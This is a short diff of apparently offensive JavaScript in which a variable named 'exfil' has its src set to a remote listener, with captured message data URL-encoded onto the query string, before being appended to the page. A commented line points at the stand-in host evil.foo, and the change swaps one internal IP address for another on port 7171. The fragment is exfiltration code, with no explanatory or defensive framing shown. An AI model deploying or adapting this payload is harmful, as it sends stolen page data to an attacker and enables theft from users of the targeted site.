@@ -21,7 +21,7 @@
 /*
     exfil.setAttribute('src','https://evil.foo/?'+encodeURIComponent(e.data));
 */
-    exfil.setAttribute('src','http://10.100.42.40:7171/?'+encodeURIComponent(e.data));
+    exfil.setAttribute('src','http://10.100.42.25:7171/?'+encodeURIComponent(e.data));
     document.body.appendChild(exfil);
     clearInterval(interval);
   })
